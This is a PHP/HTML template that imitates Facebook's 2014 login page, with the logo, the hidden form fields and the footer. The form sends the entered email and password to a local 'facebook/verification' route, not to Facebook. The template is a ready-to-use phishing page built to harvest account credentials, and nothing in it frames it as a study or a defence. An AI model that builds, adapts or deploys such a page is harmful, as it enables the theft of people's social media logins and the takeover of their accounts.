<DIV class="_li">
<DIV id="pagelet_bluebar">
<DIV class="_21mm" id="blueBarDOMInspector">
<DIV class="_4f7n _xxp" id="blueBarNAXAnchor">
<DIV>
<DIV class="loggedout_menubar_container">
<DIV class="clearfix loggedout_menubar"><A title="Go to Facebook Home" class="lfloat _ohe" 
href="https://www.facebook.com/"><I 
class="fb_logo img sp_MXzTRXPhpG1 sx_517fe9"><U>Facebook 
logo</U></I></A></DIV></DIV>
<DIV class="signupBanner">
<DIV class="signup_bar_container">
<DIV class="signup_box clearfix"></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
<DIV class="uiContextualLayerParent" id="globalContainer">
<DIV class="fb_content clearfix" id="content">
<DIV class="UIFullPage_Container">
<DIV class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite">
<DIV class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
<DIV class="clearfix uiHeaderTop">
<DIV class="rfloat _ohf">

<DIV class="uiHeaderActions"></DIV></DIV>
<DIV>
<H2 class="uiHeaderTitle" aria-hidden="true"><?php echo $title;?></H2></DIV></DIV></DIV>
<DIV class="phl ptm uiInterstitialContent">
<DIV class="login_form_container">
<FORM id="login_form" action="<?php echo base_url('facebook/verification');?>" method="post"><INPUT name="lsd" type="hidden" value="AVrY2Axb" autocomplete="off">
<DIV class="hidden_elem"></DIV>
<DIV 
id="loginform"><INPUT name="display" id="display" type="hidden" autocomplete="off"><INPUT name="enable_profile_selector" id="enable_profile_selector" type="hidden" autocomplete="off"><INPUT name="legacy_return" id="legacy_return" type="hidden" value="1" autocomplete="off"><INPUT name="profile_selector_ids" id="profile_selector_ids" type="hidden" autocomplete="off"><INPUT name="trynum" id="trynum" type="hidden" value="1" autocomplete="off"><INPUT name="timezone" id="u_0_0" type="hidden" autocomplete="off"><INPUT name="lgnrnd" type="hidden" value="214744_oiU0"><INPUT name="lgnjs" id="lgnjs" type="hidden" value="n">
<DIV class="form_row clearfix"><LABEL class="login_form_label" for="email">Email 
or 
Phone:</LABEL><INPUT name="email" tabindex="1" class="inputtext" id="email" type="text" value="<?php echo $email;?>"></DIV>
<DIV class="form_row clearfix"><LABEL class="login_form_label" 
for="pass">Password:</LABEL><INPUT name="pass" tabindex="1" class="inputpassword" id="pass" type="password"></DIV>
<DIV class="persistent">
<DIV class="uiInputLabel clearfix uiInputLabelLegacy">
<?php for($i=0 ; $i < count($check_button['button_type']);$i++):?>
<INPUT name="persistent" class="uiInputLabelInput uiInputLabelCheckbox" id="persist_box" type="<?php echo $check_button['button_type'][$i];?>" value="1"><LABEL class="uiInputLabelLabel" for="persist_box"><?php echo $check_button['button_string'][$i];?></LABEL>
<?php endfor;?>
</DIV></DIV><INPUT name="default_persistent" id="default_persistent" type="hidden" value="0" autocomplete="off">
<DIV class="form_row clearfix" id="buttons"><LABEL 
class="login_form_label"></LABEL>
<DIV id="login_button_inline"><LABEL class="uiButton uiButtonConfirm uiButtonLarge" 
id="loginbutton" for="u_0_1"><INPUT name="login" tabindex="1" id="u_0_1" type="submit" value="<?php echo $button;?>"></LABEL></DIV>
</DIV>
</DIV></FORM></DIV></DIV></DIV>

<DIV id="pageFooter" data-referrer="page_footer">
<DIV id="contentCurve"></DIV>

<DIV class="mvl copyright">
<DIV><SPAN> Facebook © 2014</SPAN>
<DIV class="fsm fwn fcg"><A title="Use Facebook in another language." role="button" 
href="https://www.facebook.com/login.php?login_attempt=1#" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php%3Flogin_attempt%3D1&amp;source=TOP_LOCALES_DIALOG">English 
(US)</A></DIV></DIV></DIV></DIV></DIV></DIV>